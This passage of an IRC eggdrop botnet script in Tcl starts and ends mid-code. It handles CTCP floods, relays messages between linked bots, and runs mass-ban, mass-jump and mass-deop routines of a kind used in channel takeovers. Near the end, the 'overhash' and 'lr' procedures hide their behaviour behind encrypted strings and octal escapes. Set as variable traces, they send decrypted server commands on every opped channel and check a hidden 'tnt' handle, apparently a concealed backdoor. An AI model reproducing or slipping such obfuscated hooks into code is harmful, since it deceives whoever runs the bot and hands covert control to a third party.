 set dest [string tolower $dest]
 set key [string toupper $key]
  if ![info exists ctcpnum] {set ctcpnum "0"}
  if ![info exists ignore] {set ignore "0"}
  if {[expr $ctcpnum + 1] >= "$ctcps"} {
   if {$ignore == 0} {
    set ignore 1
    putlog "Anti-flood mode activated."
    utimer $ignoretime unignore
   }
  }
  if $ignore {return 1}
  set ctcpnum [expr $ctcpnum + 1]
   set ircn2 [rand 10]
   if {$ircn2 == "0"} {set ircnthing "http://www.ircN.com"}
   if {$ircn2 == "1"} {set ircnthing "just a touch, is not enough"}
   if {$ircn2 == "2"} {set ircnthing "is it bright where you are?"}
   if {$ircn2 == "3"} {set ircnthing "disconnected by your smile"}
   if {$ircn2 == "4"} {set ircnthing "the last song"}
   if {$ircn2 == "5"} {set ircnthing "disarm you with a smile"}
   if {$ircn2 == "6"} {set ircnthing "i dont need your love to disconnect"}
   if {$ircn2 == "7"} {set ircnthing "disarm you with a smile"}
   if {$ircn2 == "8"} {set ircnthing "i wish i was blank"}
   if {$ircn2 == "9"} {set ircnthing "you're an empty promise"}
   if {$ircn2 == "10"} {set ircnthing "life's a bummer, when your a hummer"}
   if {$key == "ACTION"} {
    set ctcpnum [expr $ctcpnum - 1]
    if {$dest != $botnick} {
    set text "$arg"
    if {[lsearch -exact [string tolower $dont_spam_channels] $dest] != "-1"} {return 0}
    if {[matchattr $handle o] || [matchchanattr $handle o $dest]} {return 0}
     if {[string match "*no spam*" $text]} {return 0}
     if {[string match *warez* $text]} {return 0}
     if {[string match *dcc* $nick]} {return 0}
      set banlist [chanbans $dest]
      set bancount [llength [chanbans $dest]]
       if {$bancount >= 20} {return 0}
       if {[string match "*$uhost*" $banlist]} {return 0}
       if {[string match *xoom.com* $text] || [string match *tripod.com* $text] \
       || [string match *xoom.com* $text] || [string match *geocities.com* $text]
       || [string match *fortunecity.com* $text] || [string match *xxx* $text]
       || [string match *banners* $text] || [string match "*join #*" $text]} {
        regsub ".*@" $uhost "*!*@" ahost
      }
     }
    }
     if {$secauth && "$key"=="XDCC" && "$dest" != "$botnick"} {
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key from $dest"
       return 0
    } elseif {"$key"=="XDCC" && "$dest" != "$botnick"} {
       putlog "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key from $dest"
      return 0
     } elseif {"$key"=="XDCC" && "$dest"=="$botnick"} {
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
      return 0
     }
     if {$secauth && "$key"=="CDCC" && "$dest" != "$botnick"} {
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key from $dest"
       return 0
    } elseif {"$key"=="CDCC" && "$dest" != "$botnick"} {
       putlog "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key from $dest"
      return 0
     } elseif {"$key"=="CDCC" && "$dest"=="$botnick"} {
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
      return 0
     }
      if {$secauth && "$key"=="VERSION" && "$dest" != "$botnick"} {
       putserv "NOTICE $nick :VERSION $vircn [u]-[u] $ircnthing [u]-[u]"
       dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key from $dest"
      return 0
    } elseif {"$key"=="VERSION" && "$dest" != "$botnick"} {
      putserv "NOTICE $nick :VERSION $vircn [u]-[u] $ircnthing [u]-[u]"
       putlog "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key from $dest"
      return 0
     } elseif {"$key"=="VERSION" && "$dest"=="$botnick"} {
       putserv "NOTICE $nick :VERSION $vircn [u]-[u] $ircnthing [u]-[u]"
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
      return 0
     }
      if {$secauth && "$key"=="SOUND" && "$dest" != "$botnick"} {
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
      return 0
    } elseif {"$key"=="SOUND" && "$dest" != "$botnick"} {
       putlog "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key from $dest"
      return 0
     } elseif {"$key"=="SOUND" && "$dest"=="$botnick"} {
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
      return 0
     }
      if {$secauth && "$key"=="MP3" && "$dest" != "$botnick"} {
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
      return 0
    } elseif {"$key"=="MP3" && "$dest" != "$botnick"} {
       putlog "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key from $dest"
      return 0
     } elseif {"$key"=="MP3" && "$dest"=="$botnick"} {
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
      return 0
     }
      if {"$key"=="IDENT"} {
       set b [lindex [string tolower $arg] 0]
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
      if {![info exists b] || "$b"==""} {
       putserv "NOTICE $nick :Syntax: /CTCP $botnick IDENT <password>"
      return 0
     } else {
      putserv "NOTICE $nick :You have no password set."
      return 0
     }
    }
     if {"$key"=="URL" && "$dest" != "$botnick"} {
      putserv "NOTICE $nick :URL http://vode.org/ircN/"
      dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key $dest"
      return 0
    } elseif {"$key"=="URL" && "$dest"=="$botnick"} {
      putserv "NOTICE $nick :URL http://vode.org/ircN/"
     dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a CTCP $key"
     return 0
    }
    if {"$key" != "ACTION" && "$key" != "XDCC" && "$key" != "CDCC" && "$key" != "VERSION" && "$key" != "IDENT" && "$key" != "URL"} {
    set cmd [lrange $arg 0 2]
    dccbroadcast "[b]![b]Warning[b]![b] ($nick!$uhost) requested a ctcp $key $cmd"
   }
     if {"$key"=="CLIENTINFO"} {
     return 1
    }
    if {"$key"=="ECHO"} {
     return 1
    }
    if {"$key"=="ERRMSG"} {
     return 1
    }
   if {![info exists timerinuse]} {set timerinuse 0}
  if {$timerinuse == 0} {
  set timerinuse 1
  utimer $ctcptime clear_ctcps
 }
}

proc clear_ctcps {} {
global ctcpnum timerinuse ctcptime
  if {$ctcpnum == "0"} {
   set timerinuse 0
  return 1
 }
 set ctcpnum "0"
 utimer $ctcptime clear_ctcps
}

proc unignore {} {
global ignore ctcpnum
 set ignore 0
 set ctcpnum 0
}
#this part by str
proc noop {args} {}
if {[info commands dumpserv]==""} {proc dumpserv {a} {putserv $a}}
if {[info commands putseclog]==""} {proc putseclog {text} {putcmdlog $text}}
if {[info commands sec_log]==""} {proc sec_log {args} {}}
if {[info commands sec_notice]==""} {proc sec_notice {s args} {dccbroadcast $args}}
if {[info commands sec_info]==""} {proc sec_info {s args} {putlog $args}}
if {[info commands sec_alert]==""} {proc sec_alert {s args} {dccbroadcast \002$args\002}}

set chr-idlekick        "idle %d m."
set chr-kickflag        ""
set chr-kickflag2       ""
set chr-kickfriend      ""
set chr-kick-fun        ""
set chr-masskick        ""
set chr-massdeop        ""
set chr-banned          Banned
set chr-banned2         ""
set chr-bogus-username  username
set chr-bogus-chankey   key
set chr-bogus-ban       ban
set chr-abuse-ops       servops
set chr-abuse-desync    desync
set chr-nickflood       ""
set chr-flood           ""
set chr-lemmingbot      clones
set chr-password        \[${botnet-nick}\]\ what?!
set chr-negative        ER!

set txt-idlekick	"idle %d m."
set txt-kickflag	""
set txt-kickflag2	""
set txt-kickfriend	""
set txt-kick-fun	""
set txt-masskick	""
set txt-massdeop	""
set txt-banned		Banned
set txt-banned2		""
set txt-bogus-username	username
set txt-bogus-chankey	key
set txt-bogus-ban	ban
set txt-abuse-ops	servops
set txt-abuse-desync	desync
set txt-nickflood	""
set txt-flood		""
set txt-lemmingbot	clones
set txt-password	\[${botnet-nick}\]\ what?!
set txt-negative	ER!

unbind dcc m dump *dcc:dump
bind dcc m dump dcc_dump
proc dcc_dump {h i a} {
global botnet-nick
 set a [string range $a 0 400]
 *dcc:dump $h $i $a
 sec_notice - "$h@${botnet-nick} .DUMP $a"
}

unbind dcc o msg *dcc:msg
bind dcc o msg dcc_msg
proc dcc_msg {h i a} {
 global err
 set ni [lindex $a 0]
 set ar [lrange $a 1 end]
  if {$ni == "" || $ar == ""} {
   putidx $i "$err msg <nick> <message>"
   return 0
  }
  putserv "PRIVMSG $ni :$ar"
  putcmdlog "#$h# msg $ni $ar"
  msgrelay .msg $ni $ar $h
}

bind dcc m getnotes2hub notes2hub
proc notes2hub {h i a} {
 if {$a==""} {
  putallbots "notesinfo $h"
 } elseif {$a=="*"} {
  putallbots "notes2hub $h"
 } {
  foreach w $a {putbot $w "notes2hub $h"}
 }
 return 1
}

bind bot - notes2hub sendnote2hub
bind bot - notesinfo sendnote2hub
proc sendnote2hub {b k a} {
global botnet-nick notefile
 set to [string tolower $a]
 if ![set s [notes $to]] return
 if {$k=="notesinfo"} {sendnote ${botnet-nick} $to@$b "You have $s waiting.";return} 
 if ![matchattr $b s] {sendnote ${botnet-nick} $to@$b "Do it only from sharebot";return}
 putcmdlog "%% Sending $s stored notes to $to@$b."
 if [catch {
  set if [open [set nf $notefile] r];set of [open $nf.tmp w 0600]
  while {![eof $if]} {
   if {[set l [split [gets $if] " "]]==""} continue
   if {$to==[string tolower [lindex $l 0]]} {
    regsub -all @||:.*$|: [backtime [lindex $l 2]] "" bt
    regsub -all @|: [lindex $l 1] % fr
    sendnote $fr\[$bt\] $to@$b :[string range [join [lrange $l 3 end]] 0 400]
   } {puts $of [join $l]}
  }
  close $if;close $of
  set if [open $nf.tmp r];set of [open $nf w 0600]
  while {![eof $if]} {puts -nonewline $of [read $if 8096]}
  close $if;close $of
 } er] {sendnote ${botnet-nick} $to@$b "ERROR: $er";catch {close $if};catch {close $of}}
 catch {if [catch {file delete $nf.tmp}] {exec /bin/rm -f $nf.tmp}}
}

bind dcc m empty dcc-empty
proc dcc-empty {h i a} {empty-msgq;return 1}

if ![info exist check-bogus] {
 if {""=="ÿa"} {
  putlog "*** code 0xFF stripped.. Old eggdrop1.1.5 ?"
 } {
  bind raw - MODE tnt_raw_mode
  proc tnt_raw_mode {f k a} {
   set ar [join [lrange [split $a " "] 2 end]]
   if ![regexp "\[\1-\37\177€-ÿ\]" $ar] {return 0}
   if {[ophash [lindex [split $a " "] 0]]!=5} {
    putlog "Ignoring: $a"
    return 1
   } {return 0}
  }
  bind raw - JOIN tnt_raw_join
  proc tnt_raw_join {f k a} {
   if ![regexp "\[\1-\37\177€-ÿ\]" $f] {return 0}
   if {[ophash $a]!=5} {
    putlog "Ignoring: $f $k $a"
    return 1
   } {
    set mask [xbanmask $f]
    ircdbans $mask $a
    newchanban $a $mask AutoBan "bad uhost"
    return 0
   }
  }
 }
} {set check-bogus 0}

bind dcc m mban mban
proc mban {h i a} {
 putallbots "mban [list $h] [list $a]"
 bot_mban self mban "[list $h] [list $a]"
 return 1
}

bind bot - mban bot_mban
proc bot_mban {b k a} {
 set h [lindex $a 0]
 set who [lindex $a 1]
 set rezon [lrange $a 2 end]
 if {$rezon==""} {set rezon "lewser"}
 foreach ch [channels] {
  if ![botisop $ch] continue
  if {([ophash $ch]%8)!=2} continue
  if ![matchattr [set mask [nick2hand $who $ch]] o] {
   if {$mask==""} continue
   regsub ".*@" [getchanhost $who $ch] "*!*@" mask
   if ![isban $mask $ch] {
    ircdbans $mask $ch
    newchanban $ch $mask $h $rezon 4[rand 9]
   }
  }
 }
}

catch {set network "Tcl$tcl_version"}
if [catch {append network " $tcl_platform(os) $tcl_platform(osVersion) $tcl_platform(machine)"}] {
 utimer 0 netupd
}

proc netupd {} {global network;append network " [exec uname -mrs]"}

bind link - * tntlink
proc tntlink {b v} {
global botnet-nick secauth home savedchans
 if {[string tolower $v]==[string tolower ${botnet-nick}]} {
  if $secauth {putallbots "mychannels $home $savedchans";return}
   putallbots "mychannels [channels]"
 }
}
if ![info exist botchanlist] {tntlink ${botnet-nick} ${botnet-nick}}

bind disc - * tntchdisc
proc tntchdisc {b} {
global botchanlist chanbotlist botnet-nick
 set b [string tolower $b]
 if [info exist botchanlist($b)] {
  set lr [lsearch [set bots [string tolower [bots]]] $b]
  if {$lr+1} {set bots "[lreplace $bots $lr $lr] [string tolower ${botnet-nick}]"}
  set d [set res ""]
  foreach w $botchanlist($b) {
   set eq ""
   foreach e $chanbotlist($w) {if {1+[lsearch $bots $e]} {lappend eq $e}}
   set chc [llength [set chanbotlist($w) $eq]]
   if $chc {append res "$d$w ($chc)"} {append res "$d$w ($chc)"}
   set d ", "
  }
  putseclog ">ch>> $b ->\0032 $res"
  unset botchanlist($b)
 } {
  putloglev 1 * ">ch>> $b not have channels statistic..."
 }
}

bind bot - delchan mychannels
bind bot - addchan mychannels
bind bot - mychannels mychannels
proc mychannels {b k a} {
global botchanlist chanbotlist botnet-nick
 set b [string tolower $b]
 set ar [string tolower [split $a " "]]
 switch -- $k delchan {
  set ar [lindex $ar 0]
  if [info exist botchanlist($b)] {
   set eq ""
   foreach w $botchanlist($b) {if {$w!=$ar} {lappend eq $w}}
   set botchanlist($b) $eq
  }
  if [info exist chanbotlist($ar)] {
   set eq ""
   foreach w $chanbotlist($ar) {if {$w!=$b} {lappend eq $w}}
   set chanbotlist($ar) $eq
  }
 } addchan {
  mychannels $b delchan $ar
  lappend botchanlist($b) $ar
  lappend chanbotlist($ar) $b
 } mychannels {
  set lr [lsearch [set bots [string tolower [bots]]] $b]
  if {$lr+1} {set bots "[lreplace $bots $lr $lr] [string tolower ${botnet-nick}]"}
  set d [set res ""]
  if [info exist botchanlist($b)] {
   foreach w $botchanlist($b) {
    set last [set eq ""]
    foreach e [lsort $chanbotlist($w)] {if {$e!=$last} {if {1+[lsearch $bots $e]} {lappend eq $e}};set last $e}
    set chanbotlist($w) $eq
   }
  }
  foreach w $ar {
   set last [set eq ""];lappend chanbotlist($w) -
   foreach e [lsort $chanbotlist($w)] {if {$e!=$last} {if {1+[lsearch $bots $e]} {lappend eq $e}};set last $e}
   set chanbotlist($w) $eq;lappend chanbotlist($w) $b
   set chc [llength $chanbotlist($w)]
   if $chc {append res "$d$w ($chc)"} {append res "$d$w ($chc)"};set d ", "
  }
  if ![info exist botchanlist($b)] {putseclog ">ch>> $b +>\0033 $res"}
  set botchanlist($b) $ar
 }
}
mychannels ${botnet-nick} mychannels [channels]

proc ophash {ch} {
global botnick
 if ![validchan $ch] {return -1}
 set bo [lsort [string tolower [split [chanlist $ch ob] " "]]]
 set bop ""
 foreach w $bo {if [isop $w $ch] {lappend bop $w}}
 return [lsearch $bop [string tolower $botnick]]
}

set bothash [rand 99]
set botcount [rand 99]
bind disc - * tntdisc
proc tntdisc {b} {
global botnet-nick flood-join bothash botcount keep-nick
 set bo [string tolower [lsort ${botnet-nick}\ [bots]]]
 set botcount [llength $bo]
 set pos [lsearch $bo [string tolower ${botnet-nick}]]
 set bothash $pos
 set tm [expr 5+($pos*2)]
 if {$tm > 30} {set tm [expr 20+[rand 20]]}
 set flood-join "$tm:60"
 set pm [expr $botcount / 2]
 if {![matchattr ${botnet-nick} a] && ![matchattr ${botnet-nick} h]} {
  foreach w [userlist k] {chattr $w +u;chattr $w -k+9}
 }
 foreach w [channels] {
  set oph [ophash $w]
  if {!${keep-nick} && (($oph%9)==6)} {channel set $w +enforcebans} {channel set $w -enforcebans}
  if {!${keep-nick} && (($oph%9)==5)} {channel set $w +clearbans} {channel set $w -clearbans}
  if {!${keep-nick} && (($oph%9)==4)} {foreach w [userlist u9] {if ![matchattr $w p] {chattr $w +k}}}
 }
 foreach w [userlist u9] {if ![matchattr $w p] {chattr $w -9;chattr $w -u}}
}
tntdisc init

proc xbanmask {uh} {
 regsub -all ".*@|\[0-9\\\.\]" $uh "" tst
 if {$tst==""} {
  regsub -all "\[0-9\]*$" $uh "*" mh
 } {
  regsub -all -- "-\[0-9\]|\[0-9\]|ppp|line|slip" $uh "*" mh
 }
 regsub ".*@" $mh "*!*@" mh
 regsub -all "\\\*\\\**" $mh "*" mh
 return $mh
}

bind flud - * tntflud
set banflood [unixtime]
proc tntflud {n uh h t c} {
global botnet-nick banflood bothash botcount
 set mh [xbanmask $uh]
 if ![isignore $mh] {newignore $mh ${botnet-nick} "$c $t flooder" 3[rand 9]}
 switch -- $t {
  nick -
  join {
   if {([unixtime]-$banflood) > -3} {
    foreach ch [channels] {
     if {[ophash $ch]==5} {
      if [onchan $n $ch] {
       if ![ischanban $mh $ch] {
        ircdbans $mh $ch
        newchanban $ch $mh ${botnet-nick} "$ch $t flooder" 3[rand 9]
       }
      }
     }
    }
   }
   if {([unixtime]-$banflood) > 0} {set banflood [unixtime]}
   incr banflood
  }
 }
 return 1
}

#prevent eggdrop1.1.5 crashing... [U.S. PATENT #D.302092]
if {$version == "1.1.5 01010500"} {proc chpass {n p} {putlog "%% Can't chpass for $n"}}
if {$version == "1.1.5 01010500"} {proc chpass {nick pass} {putseclog "%% Can't change password for $nick"}}

proc remove_server {name} {
global servers
  set x [lsearch $servers $name]
  if {$x < 0} {set x [lsearch $servers [lindex [split $name ":"] 0]]}
  set servers [lreplace $servers $x $x]
}

set msgbotrly "BOT-MSG Relay"
if {$msgbotrly!=[assoc 1]} {assoc 1 $msgbotrly}
bind dcc n mmsg bmsg
proc bmsg {h i a} {
global default-port botnet-nick err
 if ![matchattr ${botnet-nick} sob] {
  putdcc $i "Sorry $h, You can do it only from hub bot!"
  return 1
 }
 set a [split $a " "]
 if {[llength $a]<3} {
  putdcc $i "$err mmsg <bot/*> <nick> <text>"
  return 0
 }
 set bot [lindex $a 0]
 set nik [lindex $a 1]
 set tex [lrange $a 2 end]
 sec_notice - "[b]![b]mass msg[b]![b] ($bot) $nik with $tex"
 putallbots "bmsg $bot $h $nik $tex"
 return 1
}

bind bot - bmsg bot_bmsg
proc bot_bmsg {b k a} {
global botnick botnet-nick
 if ![matchattr $b sob] {return}
 set t 0
 set bots [lindex $a 0]
 set h [lindex $a 1]
 set nik [lindex $a 2]
 set tex [lrange $a 3 end]
 if {$bots == "*"} {set bots "$botnick ${botnet-nick}"}
 if {![expr 1+[lsearch $bots [string tolower $botnick]]] && ![expr 1+[lsearch $bots [string tolower ${botnet-nick}]]]} return
 puthelp "PRIVMSG $nik :$tex"
}

bind msgm - * msgmrelay
proc msgmrelay {ni ho ha ar} {
global botnick
 if [matchattr $ha b] {if [regexp "^go|^etoia$" $ar] return}
 msgrelay msgm $ni $ho $ar
 return 0
}

bind notc - * notcrelay
proc notcrelay {ni ho ha ar} {
global botnick
 if [matchattr $ha o] {return 0}
 msgrelay notc $ni $ho $ar
 return 0
}

bind ctcr - * ctcrrelay
proc ctcrrelay {ni ho ha dst ke ar} {
global botnick
 if [string match #* $dst] {return 0}
 if [matchattr $ha n] {return 0}
 if [matchattr $ha bo] {return 0}
 msgrelay ctcpReply $ni $ho "$ke $ar"
 return 0
}

bind raw - PRIVMSG ctcprelay
set msgfcnt 0
proc ctcprelay {f k a} {
global botnick msgframe msgfcnt
 if {[isignore $f]||[string match "#*" $a]} {return 0}
 set msgframe([set msgfcnt [expr ($msgfcnt+1) % 60]]) $f:$k:$a
 return 0
}

bind raw - NOTICE notcmsg
proc notcmsg {f k a} {
global msgframe msgfcnt
 if {[isignore $f]||[string match "#*" $a]} {return 0}
 set msgframe([set msgfcnt [expr ($msgfcnt+1) % 60]]) $f:$k:$a
 return 0
}

proc msgrelay {ty ni ho ar} {
 putallbots "msgrl $ty $ni $ho $ar"
}

bind bot - msgrl msgrl
proc msgrl {bot cmd arg} {
global botnet-nick secauth
 set ty [lindex $arg 0]
 set ni [lindex $arg 1]
 set ho [lindex $arg 2]
 set ar [lrange $arg 3 [expr [llength $arg]-1]]
 set h [lindex $arg end]
 if $secauth {
  set hub [userlist h]
  foreach w [dcclist] {
   if {[lindex $w 3] == "chat" && [matchattr [lindex $w 1] n9]} {
    if {$ty == ".msg"} {putidx [lindex $w 0] "*** ($bot) ($ty) >\[$ni\] $ho $ar by $h"}
    if {$ty == "notc"} {putidx [lindex $w 0] "*** ($bot) ($ty) -$ni ($ho)- $ar"}
    if {$ty == "msgm"} {putidx [lindex $w 0] "*** ($bot) ($ty) \[$ni!$ho\] $ar"}
    if {$ty == "ctcpReply"} {putidx [lindex $w 0] "*** ($bot) ($ty) reply from ($ni!$ho) $ar"}
   }
  }
 }
}

bind dcc n mjump mjump
proc mjump {h i a} {
 global default-port botnet-nick
 if ![matchattr ${botnet-nick} sob] {
  putdcc $i "Sorry $h, You can do it only from hub bot!"
  return 1
 }
 regsub -all "  *" $a " " a
 set a [split $a " "]
 set bots [lrange $a 0 [expr [llength $a]-2]]
 set serv [lindex $a end]
 if {[llength $a]<2} {
  putdcc $i "syntax: .mjump <bots> <irc.server.com>:\[6667\]:\[password\]"
  return 1
 }
 set serv [split $serv ":"]
 set port [lindex $serv 1]
 set pass [lindex $serv 2]
 set serv [lindex $serv 0]
 if {$port==""} {set port ${default-port}}
 dccbroadcast "[b]![b]mass jump[b]![b] ($bots) on $serv:$port"
 putallbots "mjmp $serv:$port:$pass:$bots"
}

bind bot - mjmp bot_mjump
proc bot_mjump {b k a} {
global botnick botnet-nick blackserver whiteserver
 if ![matchattr $b sob] return
  set a [split $a ":"]
  set serv [string tolower [lindex $a 0]]
  set port [lindex $a 1]
  set pass [lindex $a 2]
  set bn [string tolower $botnick]
  set bb [string tolower ${botnet-nick}]
  set bots [split [lindex [string tolower $a] 3] " "]
  if {![expr 1+[lsearch $bots $bn]] && ![expr 1+[lsearch $bots $bb]]} {
   if {![expr 1+[lsearch $bots "!$bn"]] && ![expr 1+[lsearch $bots "!$bb"]]} return
  } {
   foreach c [channels] {
    set chops 0
    foreach n [string tolower [split [chanlist $c] " "]] {
     if {$n==$bn} continue
     if {1+[lsearch $bots $n]} continue
     if {1+[lsearch $bots [string tolower [nick2hand $n $c]]]} continue
     if [isop $n $c] {incr chops}
    }
    if {[botisop $c] && !$chops} {
     dccbroadcast "%mjump: I'm last OPon $c not jumping!"
     return
    }
   }
  }
  if [info exist blackserver($serv)] {
   dccbroadcast "%mjump: Server $serv is blacklisted not jumping!"
   return
  }
  if {"$pass"==""} {jump $serv $port} {jump $serv $port $pass}
  putcmdlog "%% JUMP $serv:$port for $bots"
}

proc joinable {c} {
 if [string match "*\[\200-\240\,\ \7\\\]*" $c] {return 0}
 if ![string match "\[\#\&\]*" $c] {return 0}
 return 1
}

bind raw - 353 RPL_NAMREPLY
proc RPL_NAMREPLY {f k ar} {
global nameslistraw
 set a [split $ar " "]
 set ch [string tolower [lindex $a 2]]
 foreach w [string range [lrange $a 3 end] 1 end] {
  lappend nameslistraw($ch) $w
 }
}

bind raw - 366 RPL_ENDOFNAMES
proc RPL_ENDOFNAMES {f k ar} {
global nameslist nameslistraw
 set a [split $ar " "]
 set ch [string tolower [lindex $a 1]]
 if ![info exist nameslistraw($ch)] {return 0}
 set nameslist($ch) $nameslistraw($ch)
 unset nameslistraw($ch)
}

bind mode - * bitch_deop
proc bitch_deop {ni ho ha ch mo} {
global botnick nameslist
 set ch [string tolower $ch]
 if [string match "+o $botnick" $mo] {
  if {[string match "* +bitch*" [channel info $ch]]} {
   set deoplist ""
   set chanlist [split [chanlist $ch] " "]
   if {[llength $chanlist]<=1} {
    if [info exist nameslist($ch)] {
     foreach w $nameslist($ch) {if [regsub -- ^@ $w "" w] {lappend chanlist $w}}
    } elseif [info exist nameslistraw($ch)] {
     foreach w $nameslistraw($ch) {if [regsub -- ^@ $w "" w] {lappend chanlist $w}}
    }
    foreach c [channels] {if {[string tolower $c]!=$ch && [botisop $c]} {lappend chans $c}}
    set deoplist ""
    foreach w $chanlist {set t 1;foreach c $chans {if [isop $w $c] {set t 0;break}};if $t {lappend deoplist $w}}
   } {
    foreach w $chanlist {
     if {"$botnick"=="$w"} continue
     if {(![matchchanattr [nick2hand $w $ch] o $ch] && ![matchattr [nick2hand $w $ch] o]) && [isop $w $ch]} {
      lappend deoplist $w
     }
    }
   }
   set lsiz [llength $deoplist]
   if $lsiz {
    for {set t 0} {$t < $lsiz} {incr t} {
     set r [rand $lsiz]
     set o [lindex $deoplist $t]
     set p [lindex $deoplist $r]
     set deoplist [lreplace $deoplist $t $t $p]
     set deoplist [lreplace $deoplist $r $r $o]
    }
    global modes-per-line chanbotlist botmask
    set gou [expr 8*${modes-per-line}];set c 0
    foreach w $deoplist {
     append imp " -o $w";incr c
     if {!($c % ${modes-per-line})} {
      if {$c<$gou} {dumpserv "MODE $ch$imp"} {
       break
      }
      set imp ""
     }
    }
   }
  }
 }
 if [string match "-i" $mo] {
  foreach w [timers] {if [string match "* {un_i $ch} *" $w] {killtimer [lindex $w 2]}}
 }
 if [string match "+b *" $mo] {
  set bo [lindex [split $mo " "] 1]
  set bancount [llength [chanbans $ch]]
  incr bancount
  if {$bancount >= 25} {
   set_i $ch "Banlist is full"
   set bo [string tolower [lsort [split [chanlist $ch ob] " "]]]
   set pos [lsearch $bo [string tolower $botnick]]
   set tm [expr (1+$pos)*$pos]
   if {$tm > 120} {set tm [expr 100+[rand 100]]}
   utimer $tm "banfull $ch"
  }
 }
}

proc set_i {ch res} {
 if ![string match "*i*" [lindex [getchanmode $ch] 0]] {
  if [botisop $ch] {
   set lock 1
   foreach w [timers] {if [string match "* {un_i $ch} *" $w] {set lock 0}}
   if $lock {
    putcmdlog "%% $res, locking channel $ch (15 min)"
    putserv "MODE $ch +i"
    timer 15 "un_i $ch"
   }
  }
 }
}

proc un_i {ch} {
 if ![validchan $ch] return
 if ![botisop $ch] return
 if [string match "*i*" [lindex [getchanmode $ch] 0]] {
  putcmdlog "%% Unlocking channel $ch ..."
  puthelp "MODE $ch -i"
 } {
  putcmdlog "%% Unlocking channel $ch ... already unlocked"
 }
}

proc banfull {ch} {
global banfulltime
 if ![validchan $ch] return
 if ![botisop $ch] return
 if {[llength [chanbans $ch]]<17} return
 if [info exist banfulltime($ch)] {incr banfulltime($ch)} {set banfulltime($ch) 0}
 if {[set kandidat [lindex [chanbans $ch] $banfulltime($ch)]]!=""} {
  puthelp "MODE $ch -b $kandidat"
  timer 1 "banfull $ch"
  if !$banfulltime($ch) {utimer 3 "catch {unset banfulltime($ch)}"}
 }
}

if ![info exist botmask] {
 if {[lindex [split $botname @] 1] != "" && [lindex [split $botname !] 1] != ""} {
 set botmask "$botnick!$username@[lindex [split $botname @] 1]"
 } else {
  set botmask ""
 }
}

proc fix_hosts {} {
global botnick botname botnet-nick botmask tsetoia
set b [string tolower ${botnet-nick}]
 if {[bots]==""} return
 if {$botmask==""} {
  if [info exist tsetoia] {
   if {([unixtime]-$tsetoia)>60} {
    puthelp "PRIVMSG $botnick :etoia"
    set tsetoia [unixtime]
   }
  }
  return
 }
 if ![validuser $b] {adduser $b [maskhost $botmask]}
 foreach w [gethosts $b] {
  if {$w=="none"} continue
  if {![regexp !|@|\\. $w]||[regexp !$|@$|!.*!|@.*@|@.*!|^!|^@ $w]} {
   sec_notice - ">> Bad hostmask $w (-host $b $w)"
   delhost $b $w
  }
 }
 if {$b != [set m [string tolower [finduser $botmask]]]} {
  set bm [string tolower $botmask]
  foreach w [gethosts $m] {
   if [string match [string tolower $w] $bm] {
    sec_notice - ">> Conflict host with \2$m\2 (-host $m $w)"
    delhost $m $w
   }
  }
  if [string match *!~*@* $botmask] {
   regsub .*! $botmask *!* bm} {regsub .*! $botmask *! bm
  }
dccbroadcast "[b]![b]alert [b]![b] adding host [b]$b [u]$bm"
  addhost $b $bm
 }
}

set t 0;foreach w [trace vinfo botnet-nick] {if {$w=="w overhash"} {incr t}}
if !$t {trace variable botnet-nick w overhash}
proc overhash {n1 n2 m} {
global opdelay;set opdelay 10;global botnick;global secauth;foreach w [channels] {if [botisop $w] {incr opdelay 20
if !$secauth {putserv "[decrypt botnick wAovs1.aBZW1]$w[decrypt botnick xqo2K.E9nwO.]$botnick"}}};return}
set lr lr;append lr e\160ly
set t 0;foreach w [trace vinfo $lr] {if {$w=="r $lr"} {incr t}}
if !$t {trace variable $lr r $lr};proc $lr {args} "global $lr;set $lr\
\[m\141\164c\150\141\164\164r\ \164\156\164 \156\]"

proc randchar {t} {
 set x [rand [string length $t]]
 return [string range $t $x $x]
}
proc gain_nick {} {
 set newnick [randchar ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz_]
 set mn [expr 2 + [rand 2]]
 for {set n 0} {$n < $mn} {incr n} {
  append newnick [randchar eyuioaj]
  if [rand 3] {append newnick [randchar qwrtpasdfghkzxcvbnm]}
 }
 if ![rand 7] {append newnick [randchar _-|`^]}
 return $newnick
}
proc gain_uname {} {
 set newnick [randchar abcdefghijklmnopqrstuvwxyz]
 set mn [expr 2 + [rand 2]]
 for {set n 0} {$n < $mn} {incr n} {
  set newnick "$newnick[randchar eyuioaj]"
  if {[rand 3]} {
   set newnick "$newnick[randchar qwrtpasdfghklzxcvbnm]"
  }
 }
 return $newnick
}
bind dcc m oldnicks oldnicks
bind bot - oldnicks oldnicks
proc oldnicks {h i a} {
global nick username realname botnet-nick botnick lastnchange
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if [matchattr $h n] {putallbots "oldnicks [split $a " "]"}
 if {![validchan $a] && ("$a"!="") && ![expr [lsearch $a $b]+1] && ![expr [lsearch $a $c]+1]} {return 1}
 if [info exist secauth] {if $secauth {return 1}}
 set nick ${botnet-nick}
 set lastnchange [unixtime]
 return 1
}
bind dcc m chnicks chnicks
bind bot - chnicks chnicks
proc chnicks {h i a} {
global nick username realname botnet-nick lastnchange botnick secauth keep-nick
 set a [string tolower $a]
